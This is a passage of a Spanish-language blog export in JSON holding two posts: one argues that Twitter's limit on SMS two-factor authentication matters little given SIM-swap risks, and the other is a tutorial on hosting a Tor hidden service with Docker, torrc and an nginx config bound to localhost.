identificación. Y de las 3,<strong> la que funciona mediante SMS es la más débil de todas</strong>.</p><p>En este post de Norton podemos encontrarnos el siguiente titular: <a href=\"https://us.norton.com/blog/mobile/sim-swap-fraud#\">SIM swap scams on the rise</a>.</p><div class=\"kg-card kg-callout-card kg-callout-card-red\"><div class=\"kg-callout-emoji\">💡</div><div class=\"kg-callout-text\">Según el FBI, los estafadores recurren cada vez con más frecuencia a las estafas de SIM swap. La oficina informó de que en 2021, el FBI recibió 1.611 informes de este tipo de delito. Las pérdidas superaron los 68 millones de dólares. <br><br>Desde enero de 2018 hasta diciembre de 2020, el FBI recibió solo 320 denuncias de SIM swap, y las víctimas de estos delitos perdieron alrededor de 12 millones de dólares.</div></div><p>Aun en 2023, es relativamente fácil la forma en la que alguien puede suplantar nuestra tarjeta SIM, ya sea mediante ingeniería social contra uno de los operadores de nuestra compañía telefónica (la forma más común de llevarlo a cabo) o clonando físicamente la tarjeta. Y con ello, el 2FA sostenido mediante SMS pasa a ser absurdamente inútil. De hecho, si tu banco te envía por SMS una clave para acceder a tu cuenta corriente, CAMBIA de banco.</p><p><strong>Twitter, a día de hoy y no parece que vaya a cambiar, sigue permitiendo utilizar los otros 2 métodos de autenticación de doble factor para TODOS los usuarios, independientemente de su tipo de cuenta.</strong></p><p>Solo aquellos que pagan, pueden seguir utilizando el método (más) inseguro de los 3.</p><h1 id=\"que-es-2fa\">Que es 2FA</h1><p>La autenticación en dos fases (<strong>2FA</strong>) es un <strong>método de seguridad de administración de identidad y acceso que requiere dos formas de identificación para obtener acceso a los recursos y los datos.</strong></p><p>La forma de funcionamiento es la siguiente:</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2023/02/2fa_Excalidraw-1.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"850\" height=\"858\" srcset=\"__GHOST_URL__/content/images/size/w600/2023/02/2fa_Excalidraw-1.png 600w, __GHOST_URL__/content/images/2023/02/2fa_Excalidraw-1.png 850w\" sizes=\"(min-width: 720px) 720px\"></figure><!--kg-card-begin: markdown--><ol>\n<li>Inicias sesión en una plataforma mediante un usuario y una contraseña.</li>\n<li>Si la contraseña es correcta, se genera un desafio. Este desafio consiste en introducir una clave válida.</li>\n<li>Dependiendo el método de <strong>2FA</strong> que tengas configurado, tienes hasta 3 formas de generar esa clave válida.<br>\n3.1. Te llega un SMS con una clave.<br>\n3.2. Mediante un USB especial, lo introduces en el ordenador y la aplicación lo reconoce, dando paso en caso de ser un USB correcto.<br>\n3.3. Mediante una aplicación tipo <a href=\"https://latch.elevenpaths.com/\">Latch</a> o Google Authenticator, se genera una clave que dura unos segundos y que tienes que introducir como desafio.</li>\n</ol>\n<!--kg-card-end: markdown--><h1 id=\"c%C3%B3mo-podemos-mejorar-la-seguridad\">Cómo podemos mejorar la seguridad</h1><p>¿De qué forma podemos incrementar la seguridad de acceso a una plataforma? Hay un mecanismo que, si bien no es infalible, dificulta mucho que alguien pueda suplantar nuestra identidad. La mejor forma de autenticación es cuando el método de autenticación tiene en cuenta las siguientes 3 cosas:</p><ul><li><strong>Algo que sabes</strong>, como por ejemplo un pin o una contraseña.</li><li><strong>Algo que tienes</strong>, como por ejemplo un dispositivo, token o aplicación.</li><li><strong>Algo que eres,</strong> (autenticación biométrica), como una huella dactilar o reconocimiento facial.</li></ul><figure class=\"kg-card kg-bookmark-card\"><a class=\"kg-bookmark-container\" href=\"https://www.incibe.es/protege-tu-empresa/blog/algo-sabes-tienes-eres-contrasenas-identidad-online\"><div class=\"kg-bookmark-content\"><div class=\"kg-bookmark-title\">Algo que sabes, algo que tienes y algo que eres. ¿Sabes de qué estamos hablando?</div><div class=\"kg-bookmark-description\">En la actualidad la utilización de contraseñas es un elemento básico y casi podríamos decir que cotidiano. Sin embargo, sigue presentando debilidades, relacionadas con la limitada capacidad humana</div><div class=\"kg-bookmark-metadata\"><img class=\"kg-bookmark-icon\" src=\"https://www.incibe.es/sites/default/files/iconos_ios/apple-touch-icon-180x180.png\" alt=\"\"><span class=\"kg-bookmark-author\">INCIBE</span></div></div><div class=\"kg-bookmark-thumbnail\"><img src=\"https://www.incibe.es/sites/default/files/contenidos/blog/post_d5_txt3.png\" alt=\"\"></div></a></figure><p>Existen muchas aplicaciones en el mercado que permiten implementar <strong>2FA </strong>(o incluso <strong>MFA</strong>) como <a href=\"https://latch.elevenpaths.com/\">Latch</a>, <a href=\"https://support.google.com/accounts/answer/1066447?hl=en&amp;co=GENIE.Platform%3DAndroid\">Google Authenticator</a> o <a href=\"https://www.microsoft.com/en-us/security/mobile-authenticator-app\">Microsoft Authenticator</a>.</p><p>Pero tienen también su parte mala.</p><ul><li>Para acceder a ellas, necesitarás una contraseña. Intenta que ésta sea lo suficientemente segura como para que no te la puedan robar.</li><li>En algunos casos como <strong>Google Auth</strong>, si pierdes el dispositivo, tienes que contactar hasta con el mismísimo Joe Biden para recuperar el acceso al dispositivo.</li></ul><p>En definitiva, dependes al 100% de este mecanismo para acceder a todas tus cuentas.</p><p>Personalmente, me quedo con <strong>Latch</strong>, puesto que puedes configurar un método de autenticación biométrico para abrirla y si pierdes el dispositivo, puedes iniciar sesión desde cualquier sitio conectado a internet.</p><h1 id=\"conclusi%C3%B3n\">Conclusión</h1><p>Twitter sigue siendo tan seguro (o inseguro) como lo era antes. De hecho, se puede afirmar que trata mejor a sus usuarios gratuitos en este sentido que a aquellos que pasan por caja.</p><p>Cualquier plataforma hoy en día permite utilizar 2FA como método de autenticación alternativa y entre ellas, la que funciona vía SMS es la más insegura. Esto no quiere decir que dejemos de utilizarla si es nuestro caso. Siempre será mejor esto que entrar en tu cuenta solo con la contraseña. Pero como siempre, cuanto más mecanismos de seguridad utilices en tus cuentas, estarás un poco más protegido que los que no utilizan ninguna.</p>",
            "comment_id": "63f31c79331f0f005b7da685",
            "plaintext": "De hecho, n(os) ha hecho un favor.\n\n\nContexto\n\nEl pasado 15 de febrero de 2023 Twitter anunció que hacía un cambio en su política de seguridad. El cambio consistía en que el método de autenticación de doble factor vía SMS solo iba a mantenerse para aquellos usuarios que estuviesen suscritos a Twitter Blue. O dicho de otra manera, si no pagas 8€/mes, pierdes esta funcionalidad.\n\nNo son pocos los medios como antena3, CNN u otros tecnológicos como Xataka que se han hecho eco de esta noticia diciendo que Twitter despliega esta medida para favorecer a los usuarios de pago dejando en la estacada a aquellos que no pagasen por su marca de verificado o su Twitter Blue. Que la seguridad de una plataforma ahora es algo de unos pocos privilegiados. Y es que esta afirmación, es cuanto menos engañosa. Una media verdad que no busca informar realmente a las personas. Vamos a examinar por qué.\n\nTwitter ofrece (ofrecía) 3 métodos diferentes de autenticación de doble factor (o 2FA).\n\n * 2FA vía SMS\n * 2FA vía TOTP app (time based one time password)\n * 2FA vía USB key\n\nEn resumidas cuentas, lo que los 3 métodos consiguen, es que para acceder a tu cuenta, sea necesario una segunda forma de identificación. Y de las 3, la que funciona mediante SMS es la más débil de todas.\n\nEn este post de Norton podemos encontrarnos el siguiente titular: SIM swap scams on the rise.\n\n💡Según el FBI, los estafadores recurren cada vez con más frecuencia a las estafas de SIM swap. La oficina informó de que en 2021, el FBI recibió 1.611 informes de este tipo de delito. Las pérdidas superaron los 68 millones de dólares.\n\nDesde enero de 2018 hasta diciembre de 2020, el FBI recibió solo 320 denuncias de SIM swap, y las víctimas de estos delitos perdieron alrededor de 12 millones de dólares.\n\nAun en 2023, es relativamente fácil la forma en la que alguien puede suplantar nuestra tarjeta SIM, ya sea mediante ingeniería social contra uno de los operadores de nuestra compañía telefónica (la forma más común de llevarlo a cabo) o clonando físicamente la tarjeta. Y con ello, el 2FA sostenido mediante SMS pasa a ser absurdamente inútil. De hecho, si tu banco te envía por SMS una clave para acceder a tu cuenta corriente, CAMBIA de banco.\n\nTwitter, a día de hoy y no parece que vaya a cambiar, sigue permitiendo utilizar los otros 2 métodos de autenticación de doble factor para TODOS los usuarios, independientemente de su tipo de cuenta.\n\nSolo aquellos que pagan, pueden seguir utilizando el método (más) inseguro de los 3.\n\n\nQue es 2FA\n\nLa autenticación en dos fases (2FA) es un método de seguridad de administración de identidad y acceso que requiere dos formas de identificación para obtener acceso a los recursos y los datos.\n\nLa forma de funcionamiento es la siguiente:\n\n 1. Inicias sesión en una plataforma mediante un usuario y una contraseña.\n 2. Si la contraseña es correcta, se genera un desafio. Este desafio consiste en introducir una clave válida.\n 3. Dependiendo el método de 2FA que tengas configurado, tienes hasta 3 formas de generar esa clave válida.\n    \n    3.1. Te llega un SMS con una clave.\n    \n    3.2. Mediante un USB especial, lo introduces en el ordenador y la aplicación lo reconoce, dando paso en caso de ser un USB correcto.\n    \n    3.3. Mediante una aplicación tipo Latch o Google Authenticator, se genera una clave que dura unos segundos y que tienes que introducir como desafio.\n\n\n\nCómo podemos mejorar la seguridad\n\n¿De qué forma podemos incrementar la seguridad de acceso a una plataforma? Hay un mecanismo que, si bien no es infalible, dificulta mucho que alguien pueda suplantar nuestra identidad. La mejor forma de autenticación es cuando el método de autenticación tiene en cuenta las siguientes 3 cosas:\n\n * Algo que sabes, como por ejemplo un pin o una contraseña.\n * Algo que tienes, como por ejemplo un dispositivo, token o aplicación.\n * Algo que eres, (autenticación biométrica), como una huella dactilar o reconocimiento facial.\n\nAlgo que sabes, algo que tienes y algo que eres. ¿Sabes de qué estamos hablando?En la actualidad la utilización de contraseñas es un elemento básico y casi podríamos decir que cotidiano. Sin embargo, sigue presentando debilidades, relacionadas con la limitada capacidad humanaINCIBE\n\nExisten muchas aplicaciones en el mercado que permiten implementar 2FA (o incluso MFA) como Latch, Google Authenticator o Microsoft Authenticator.\n\nPero tienen también su parte mala.\n\n * Para acceder a ellas, necesitarás una contraseña. Intenta que ésta sea lo suficientemente segura como para que no te la puedan robar.\n * En algunos casos como Google Auth, si pierdes el dispositivo, tienes que contactar hasta con el mismísimo Joe Biden para recuperar el acceso al dispositivo.\n\nEn definitiva, dependes al 100% de este mecanismo para acceder a todas tus cuentas.\n\nPersonalmente, me quedo con Latch, puesto que puedes configurar un método de autenticación biométrico para abrirla y si pierdes el dispositivo, puedes iniciar sesión desde cualquier sitio conectado a internet.\n\n\nConclusión\n\nTwitter sigue siendo tan seguro (o inseguro) como lo era antes. De hecho, se puede afirmar que trata mejor a sus usuarios gratuitos en este sentido que a aquellos que pasan por caja.\n\nCualquier plataforma hoy en día permite utilizar 2FA como método de autenticación alternativa y entre ellas, la que funciona vía SMS es la más insegura. Esto no quiere decir que dejemos de utilizarla si es nuestro caso. Siempre será mejor esto que entrar en tu cuenta solo con la contraseña. Pero como siempre, cuanto más mecanismos de seguridad utilices en tus cuentas, estarás un poco más protegido que los que no utilizan ninguna.",
            "feature_image": "__GHOST_URL__/content/images/2023/02/twitter_2fa.jpg",
            "featured": 0,
            "type": "post",
            "status": "published",
            "locale": null,
            "visibility": "public",
            "email_recipient_filter": "all",
            "created_at": "2023-02-20T07:08:41.000Z",
            "updated_at": "2023-02-20T10:41:15.000Z",
            "published_at": "2023-02-20T10:30:53.000Z",
            "custom_excerpt": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "custom_template": null,
            "canonical_url": null,
            "newsletter_id": null
          },
          {
            "id": "644610d6060675005bf3069d",
            "uuid": "21519dc8-d066-492b-b3b6-6672e0103640",
            "title": "Despliega un hidden service en la red TOR (Deep Web)",
            "slug": "despliega-una-web-en-la-red-tor-deep-web",
            "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"language\":\"Dockerfile\",\"code\":\"FROM nginx:1.24.0\\n\\n# Base packages\\nRUN apt-get update && \\\\\\n    apt-get -y install \\\\\\n    tor torsocks ntpdate \\\\\\n    qrencode\\n\\n# Tor Config\\nCOPY ./torrc /etc/tor/torrc\\n\\n# Nginx configuration \\nCOPY ./web/ /usr/share/nginx/html/\\nCOPY ./nginx.conf /etc/nginx/conf.d/nginx.conf\\nEXPOSE 80\\n\\n# Entrypoint copy\\nCOPY files/entrypoint.sh /entrypoint.sh\\n\\nENTRYPOINT [\\\"/entrypoint.sh\\\"]\",\"caption\":\"Dockerfile\"}],[\"code\",{\"language\":\"torrc\",\"code\":\"DataDirectory /tmp/tor\\nHiddenServiceDir /var/lib/tor/hidden_service/\\nHiddenServicePort 80 127.0.0.1:80\\nLog notice stdout\",\"caption\":\"torrc\"}],[\"code\",{\"language\":\"nginx\",\"code\":\"server {\\n  listen 127.0.0.1:80 default_server;\\n  server_name localhost;\\n\\n  root /usr/share/nginx/html;\\n  index index.html;\\n\\n  location / {\\n    allow 127.0.0.1;\\n    deny all;\\n  }\\n}\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2023/05/tor-network-schema.png\",\"width\":1241,\"height\":534,\"caption\":\"Tor network schema\"}],[\"code\",{\"language\":\"bash\",\"code\":\"git clone https://github.com/0x10-z/docker-tor-nginx\\ncd docker-tor-nginx\\ndocker-compose up\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2023/05/tor-nginx-bash.png\",\"width\":2726,\"height\":558,\"cardWidth\":\"\"}],[\"image\",{\"caption\":\"Matrix Tor\",\"src\":\"__GHOST_URL__/content/images/2023/05/matrix-tor.gif\",\"width\":600,\"height\":594}]],\"markups\":[[\"em\"],[\"strong\"],[\"a\",[\"href\",\"https://www.torproject.org/es/download/\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"Vamos a ver lo fácil que es publicar una web (\"],[0,[0],1,\"hidden service\"],[0,[],0,\") que solo es visible dentro de la red Tor\"],[0,[0],1,\" \"],[0,[],0,\"o lo que más llanamente se conoce como \"],[0,[1],1,\"Deep Web.\"]]],[1,\"h2\",[[0,[],0,\"Introducción\"]]],[1,\"p\",[[0,[],0,\"Un \"],[0,[0],1,\"hidden service\"],[0,[],0,\" en la red Tor se refiere a un servicio o sitio web que se aloja en una red anónima dentro de la Deep Web. Estos sitios web no son accesibles a través de Internet público, sino que solo se pueden acceder a través de un navegador especializado denominado \"],[0,[0,2],2,\"Tor Browser\"],[0,[],0,\". Puedes descargarlo de forma gratuita desde \"],[0,[2],1,\"https://torproject.org/es/download/\"],[0,[],0,\".\"]]],[1,\"p\",[[0,[],0,\"Los sitios web de \"],[0,[0],1,\"hidden service\"],[0,[],0,\" se ejecutan en servidores dentro de la red Tor y se identifican por una dirección \"],[0,[0],1,\".onion\"],[0,[],0,\" en lugar de una dirección IP convencional. Estas direcciones \"],[0,[0],1,\".onion\"],[0,[],0,\" se generan automáticamente y son únicas para cada sitio web, lo que los hace difíciles de rastrear y localizar. La pinta que tienen son las de un \"],[0,[0],1,\"hash \"],[0,[],0,\"aleatorio generado por una clave pública. Por ejemplo:\"],[0,[0],1,\" ca4p2udpkmrambici5vs3e3bqsqelorqr6lzr5cdk2ab7acsyp2njiid.onion\"]]],[1,\"p\",[[0,[],0,\"Debido a que estos sitios web están alojados en una red anónima, los usuarios que acceden a ellos también permanecen en el anonimato. Esto los convierte en sitios populares para actividades ilegales, como la venta de drogas, armas y servicios de \"],[0,[0],1,\"hacking\"],[0,[],0,\", pero también se utilizan para actividades legítimas, como la comunicación anónima o el periodismo.\"]]],[1,\"h2\",[[0,[],0,\"Archivos necesarios\"]]],[1,\"p\",[[0,[],0,\"Utilizaremos \"],[0,[1],1,\"Docker\"],[0,[],0,\" para lanzar los servicios necesarios, así como la web que queremos publicar.\"]]],[3,\"ul\",[[[0,[],0,\"Nos basaremos en una imagen de Nginx para el servidor web.\"]],[[0,[],0,\"Instalaremos los paquetes necesarios para conectarnos con Tor y sincronizar la hora del servidor para que el puente que se establece en la red sea capaz de cifrar/descifrar los paquetes correctamente.\"]],[[0,[],0,\"Reemplazaremos los archivos de configuración \"],[0,[0],1,\"torrc \"],[0,[],0,\"y \"],[0,[0],1,\"nginx.conf\"],[0,[],0,\" necesarios en nuestra imagen Docker para que cumpla con nuestros requisitos.\"]]]],[1,\"p\",[[0,[],0,\"Este es el \"],[0,[1],1,\"Dockerfile\"],[0,[],0,\".\"]]],[10,0],[1,\"p\",[[0,[],0,\"No hay mucho que señalar. Basándonos en la imagen base de Nginx, instalamos los paquetes y copiamos algunos archivos a la imagen de Docker.\"]]],[1,\"p\",[[0,[],0,\"Vamos a echarle un vistazo a \"],[0,[1],1,\"torrc\"],[0,[],0,\", un archivo de configuración para personalizar la forma en que el cliente Tor funciona. Este archivo se encuentra dentro de \"],[0,[0],1,\"/etc/tor/torrc \"],[0,[],0,\"pero el manifiesto de Docker ya se encargará de dejarlo donde debe.\"]]],[10,1],[1,\"p\",[[0,[0],1,\"HiddenServiceDir \"],[0,[],0,\"y \"],[0,[0],1,\"HiddenServicePort \"],[0,[],0,\"son las claves más importantes de este archivo.\"]]],[1,\"p\",[[0,[],0,\"El primero, específica donde deseas que Tor genere la clave publica/privada, así como el hostname de la web donde se encontrará la web. Esta carpeta es muy importante y conviene tener los permisos del directorio correctos porque alguien podría atacar nuestra máquina a través del directorio, perdiendo todo el anonimato para los clientes que se conectan a nosotros.\"]]],[1,\"p\",[[0,[],0,\"El segundo, le dice a Tor donde está el servicio web al que tiene que redirigir todo el trafico. En este caso, especificamos que todas las peticiones que entren por el puerto \"],[0,[0],1,\"80 \"],[0,[],0,\"sean redirigidas al \"],[0,[0],1,\"127.0.0.1:80\"],[0,[],0,\" donde estará la web sirviendo el contenido.\"]]],[1,\"p\",[[0,[],0,\"A continuación, vamos a echarle un vistazo al archivo de \"],[0,[1],1,\"Nginx.conf\"],[0,[],0,\".\"]]],[10,2],[1,\"p\",[[0,[],0,\"Es un archivo muy básico que puede ser extendido sin ningún problema, pero debemos fijarnos en la definición de \"],[0,[0],1,\"'location /'.\"]]],[10,3],[1,\"p\",[[0,[1],1,\"Solo se permitirán las peticiones provenientes de 127.0.0.1\"],[0,[],0,\", localhost, y \"],[0,[1],1,\"se denegará el resto de peticiones\"],[0,[],0,\" que pudiesen llegar a la máquina. Es decir, estas dos líneas son las que diferencian a un servidor web normal de uno en la Deep Web, y el servicio Tor que hemos instalado es el que se encarga de redirigir peticiones que vengan de su red como hemos visto en Torrc.\"]]],[1,\"h2\",[[0,[],0,\"Demo\"]]],[3,\"ol\",[[[0,[],0,\"Descargamos Tor Browser para instalarlo en el equipo: \"],[0,[2],1,\"https://www.torproject.org/es/download/\"]],[[0,[],0,\"Descargamos el repositorio listo para ser ejecutado.\"]]]],[10,4],[1,\"p\",[[0,[],0,\"3. Cuando tengamos el servicio corriendo en la terminal, buscamos una entrada como la siguiente:\"]]],[10,5],[1,\"p\",[[0,[],0,\"Copiamos en el portapapeles la URL generada \"],[0,[0],1,\"nq35a2auw5abqiz5sgtfj4yzggdak3n3roci4cmppo64nujh33plz4ad.onion\"]]],[1,\"p\",[[0,[],0,\"4. Pegamos la URL en el navegador Tor y a disfrutar.\"]]],[10,6],[1,\"p\",[]],[1,\"p\",[]]],\"ghostVersion\":\"4.0\"}",
            "lexical": null,
            "html": "<p>Vamos a ver lo fácil que es publicar una web (<em>hidden service</em>) que solo es visible dentro de la red Tor<em> </em>o lo que más llanamente se conoce como <strong>Deep Web.</strong></p><h2 id=\"introducci%C3%B3n\">Introducción</h2><p>Un <em>hidden service</em> en la red Tor se refiere a un servicio o sitio web que se aloja en una red anónima dentro de la Deep Web. Estos sitios web no son accesibles a través de Internet público, sino que solo se pueden acceder a través de un navegador especializado denominado <em><a href=\"https://www.torproject.org/es/download/\">Tor Browser</a></em>. Puedes descargarlo de forma gratuita desde <a href=\"https://www.torproject.org/es/download/\">https://torproject.org/es/download/</a>.</p><p>Los sitios web de <em>hidden service</em> se ejecutan en servidores dentro de la red Tor y se identifican por una dirección <em>.onion</em> en lugar de una dirección IP convencional. Estas direcciones <em>.onion</em> se generan automáticamente y son únicas para cada sitio web, lo que los hace difíciles de rastrear y localizar. La pinta que tienen son las de un <em>hash </em>aleatorio generado por una clave pública. Por ejemplo:<em> ca4p2udpkmrambici5vs3e3bqsqelorqr6lzr5cdk2ab7acsyp2njiid.onion</em></p><p>Debido a que estos sitios web están alojados en una red anónima, los usuarios que acceden a ellos también permanecen en el anonimato. Esto los convierte en sitios populares para actividades ilegales, como la venta de drogas, armas y servicios de <em>hacking</em>, pero también se utilizan para actividades legítimas, como la comunicación anónima o el periodismo.</p><h2 id=\"archivos-necesarios\">Archivos necesarios</h2><p>Utilizaremos <strong>Docker</strong> para lanzar los servicios necesarios, así como la web que queremos publicar.</p><ul><li>Nos basaremos en una imagen de Nginx para el servidor web.</li><li>Instalaremos los paquetes necesarios para conectarnos con Tor y sincronizar la hora del servidor para que el puente que se establece en la red sea capaz de cifrar/descifrar los paquetes correctamente.</li><li>Reemplazaremos los archivos de configuración <em>torrc </em>y <em>nginx.conf</em> necesarios en nuestra imagen Docker para que cumpla con nuestros requisitos.</li></ul><p>Este es el <strong>Dockerfile</strong>.</p><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-Dockerfile\">FROM nginx:1.24.0\n\n# Base packages\nRUN apt-get update &amp;&amp; \\\n    apt-get -y install \\\n    tor torsocks ntpdate \\\n    qrencode\n\n# Tor Config\nCOPY ./torrc /etc/tor/torrc\n\n# Nginx configuration \nCOPY ./web/ /usr/share/nginx/html/\nCOPY ./nginx.conf /etc/nginx/conf.d/nginx.conf\nEXPOSE 80\n\n# Entrypoint copy\nCOPY files/entrypoint.sh /entrypoint.sh\n\nENTRYPOINT [\"/entrypoint.sh\"]</code></pre><figcaption>Dockerfile</figcaption></figure><p>No hay mucho que señalar. Basándonos en la imagen base de Nginx, instalamos los paquetes y copiamos algunos archivos a la imagen de Docker.</p><p>Vamos a echarle un vistazo a <strong>torrc</strong>, un archivo de configuración para personalizar la forma en que el cliente Tor funciona. Este archivo se encuentra dentro de <em>/etc/tor/torrc </em>pero el manifiesto de Docker ya se encargará de dejarlo donde debe.</p><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-torrc\">DataDirectory /tmp/tor\nHiddenServiceDir /var/lib/tor/hidden_service/\nHiddenServicePort 80 127.0.0.1:80\nLog notice stdout</code></pre><figcaption>torrc</figcaption></figure><p><em>HiddenServiceDir </em>y <em>HiddenServicePort </em>son las claves más importantes de este archivo.</p><p>El primero, específica donde deseas que Tor genere la clave publica/privada, así como el hostname de la web donde se encontrará la web. Esta carpeta es muy importante y conviene tener los permisos del directorio correctos porque alguien podría atacar nuestra máquina a través del directorio, perdiendo todo el anonimato para los clientes que se conectan a nosotros.</p><p>El segundo, le dice a Tor donde está el servicio web al que tiene que redirigir todo el trafico. En este caso, especificamos que todas las peticiones que entren por el puerto <em>80 </em>sean redirigidas al <em>127.0.0.1:80</em> donde estará la web sirviendo el contenido.</p><p>A continuación, vamos a echarle un vistazo al archivo de <strong>Nginx.conf</strong>.</p><pre><code class=\"language-nginx\">server {\n  listen 127.0.0.1:80 default_server;\n  server_name localhost;\n\n  root /usr/share/nginx/html;\n  index index.html;\n\n  location / {\n    allow 127.0.0.1;\n    deny all;\n  }\n}</code></pre><p>Es un archivo muy básico que puede ser extendido sin ningún problema, pero debemos fijarnos en la definición de <em>'location /'.</em></p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2023/05/tor-network-schema.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"1241\" height=\"534\" srcset=\"__GHOST_URL__/content/images/size/w600/2023/05/tor-network-schema.png 600w, __GHOST_URL__/content/images/size/w1000/2023/05/tor-network-schema.png 1000w, __GHOST_URL__/content/images/2023/05/tor-network-schema.png 1241w\" sizes=\"(min-width: 720px) 720px\"><figcaption>Tor network schema</figcaption></figure><p><strong>Solo se permitirán las peticiones provenientes de 127.0.0.1</strong>, localhost, y <strong>se denegará el resto de peticiones</strong> que pudiesen llegar a la máquina. Es decir, estas dos líneas son las que diferencian a un servidor web normal de uno en la Deep Web, y el servicio Tor que hemos instalado es el que se encarga de redirigir peticiones que vengan de su red como hemos visto en Torrc.</p><h2 id=\"demo\">Demo</h2><ol><li>Descargamos Tor Browser para instalarlo en el equipo: <a href=\"https://www.torproject.org/es/download/\">https://www.torproject.org/es/download/</a></li><li>Descargamos el repositorio listo para ser ejecutado.</li></ol><pre><code class=\"language-bash\">git clone https://github.com/0x10-z/docker-tor-nginx\ncd docker-tor-nginx\ndocker-compose up</code></pre><p>3. Cuando tengamos el servicio corriendo en la terminal, buscamos una entrada como la siguiente:</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2023/05/tor-nginx-bash.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"2000\" height=\"409\" srcset=\"__GHOST_URL__/content/images/size/w600/2023/05/tor-nginx-bash.png 600w, __GHOST_URL__/content/images/size/w1000/2023/05/tor-nginx-bash.png 1000w, __GHOST_URL__/content/images/size/w1600/2023/05/tor-nginx-bash.png 1600w, __GHOST_URL__/content/images/size/w2400/2023/05/tor-nginx-bash.png 2400w\" sizes=\"(min-width: 720px) 720px\"></figure><p>Copiamos en el portapapeles la URL generada <em>nq35a2auw5abqiz5sgtfj4yzggdak3n3roci4cmppo64nujh33plz4ad.onion</em></p><p>4. Pegamos la URL en el navegador Tor y a disfrutar.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2023/05/matrix-tor.gif\" class=\"kg-image\" alt loading=\"lazy\" width=\"600\" height=\"594\" srcset=\"__GHOST_URL__/content/images/2023/05/matrix-tor.gif 600w\"><figcaption>Matrix Tor</figcaption></figure><p></p>",
            "comment_id": "644610d6060675005bf3069d",
            "plaintext": "Vamos a ver lo fácil que es publicar una web (hidden service) que solo es visible dentro de la red Tor o lo que más llanamente se conoce como Deep Web.\n\n\nIntroducción\n\nUn hidden service en la red Tor se refiere a un servicio o sitio web que se aloja en una red anónima dentro de la Deep Web. Estos sitios web no son accesibles a través de Internet público, sino que solo se pueden acceder a través de un navegador especializado denominado Tor Browser. Puedes descargarlo de forma gratuita desde https://torproject.org/es/download/.\n\nLos sitios web de hidden service se ejecutan en servidores dentro de la red Tor y se identifican por una dirección .onion en lugar de una dirección IP convencional. Estas direcciones .onion se generan automáticamente y son únicas para cada sitio web, lo que los hace difíciles de rastrear y localizar. La pinta que tienen son las de un hash aleatorio generado por una clave pública. Por ejemplo: ca4p2udpkmrambici5vs3e3bqsqelorqr6lzr5cdk2ab7acsyp2njiid.onion\n\nDebido a que estos sitios web están alojados en una red anónima, los usuarios que acceden a ellos también permanecen en el anonimato. Esto los convierte en sitios populares para actividades ilegales, como la venta de drogas, armas y servicios de hacking, pero también se utilizan para actividades legítimas, como la comunicación anónima o el periodismo.\n\n\nArchivos necesarios\n\nUtilizaremos Docker para lanzar los servicios necesarios, así como la web que queremos publicar.\n\n * Nos basaremos en una imagen de Nginx para el servidor web.\n * Instalaremos los paquetes necesarios para conectarnos con Tor y sincronizar la hora del servidor para que el puente que se establece en la red sea capaz de cifrar/descifrar los paquetes correctamente.\n * Reemplazaremos los archivos de configuración torrc y nginx.conf necesarios en nuestra imagen Docker para que cumpla con nuestros requisitos.\n\nEste es el Dockerfile.\n\nFROM nginx:1.24.0\n\n# Base packages\nRUN apt-get update && \\\n    apt-get -y install \\\n    tor torsocks ntpdate \\\n    qrencode\n\n# Tor Config\nCOPY ./torrc /etc/tor/torrc\n\n# Nginx configuration \nCOPY ./web/ /usr/share/nginx/html/\nCOPY ./nginx.conf /etc/nginx/conf.d/nginx.conf\nEXPOSE 80\n\n# Entrypoint copy\nCOPY files/entrypoint.sh /entrypoint.sh\n\nENTRYPOINT [\"/entrypoint.sh\"]\n\nNo hay mucho que señalar. Basándonos en la imagen base de Nginx, instalamos los paquetes y copiamos algunos archivos a la imagen de Docker.\n\nVamos a echarle un vistazo a torrc, un archivo de configuración para personalizar la forma en que el cliente Tor funciona. Este archivo se encuentra dentro de /etc/tor/torrc pero el manifiesto de Docker ya se encargará de dejarlo donde debe.\n\nDataDirectory /tmp/tor\nHiddenServiceDir /var/lib/tor/hidden_service/\nHiddenServicePort 80 127.0.0.1:80\nLog notice stdout\n\nHiddenServiceDir y HiddenServicePort son las claves más importantes de este archivo.\n\nEl primero, específica donde deseas que Tor genere la clave publica/privada, así como el hostname de la web donde se encontrará la web. Esta carpeta es muy importante y conviene tener los permisos del directorio correctos porque alguien podría atacar nuestra máquina a través del directorio, perdiendo todo el anonimato para los clientes que se conectan a nosotros.\n\nEl segundo, le dice a Tor donde está el servicio web al que tiene que redirigir todo el trafico. En este caso, especificamos que todas las peticiones que entren por el puerto 80 sean redirigidas al 127.0.0.1:80 donde estará la web sirviendo el contenido.\n\nA continuación, vamos a echarle un vistazo al archivo de Nginx.conf.\n\nserver {\n  listen 127.0.0.1:80 default_server;\n  server_name localhost;\n\n  root /usr/share/nginx/html;\n  index index.html;\n\n  location / {\n    allow 127.0.0.1;\n    deny all;\n  }\n}\n\nEs un archivo muy básico que puede ser extendido sin ningún problema, pero debemos fijarnos en la definición de 'location /'.\n\nSolo se permitirán las peticiones provenientes de 127.0.0.1, localhost, y se denegará el resto de peticiones que pudiesen llegar a la máquina. Es decir, estas dos líneas son las que diferencian a un servidor web normal de uno en la Deep Web, y el servicio Tor que hemos instalado es el que se encarga de redirigir peticiones que vengan de su red como hemos visto en Torrc.\n\n\nDemo\n\n 1. Descargamos Tor Browser para instalarlo en el equipo: https://www.torproject.org/es/download/\n 2. Descargamos el repositorio listo para ser ejecutado.\n\ngit clone https://github.com/0x10-z/docker-tor-nginx\ncd docker-tor-nginx\ndocker-compose up\n\n3. Cuando tengamos el servicio corriendo en la terminal, buscamos una entrada como la siguiente:\n\nCopiamos en el portapapeles la URL generada nq35a2auw5abqiz5sgtfj4yzggdak3n3roci4cmppo64nujh33plz4ad.onion\n\n4. Pegamos la URL en el navegador Tor y a 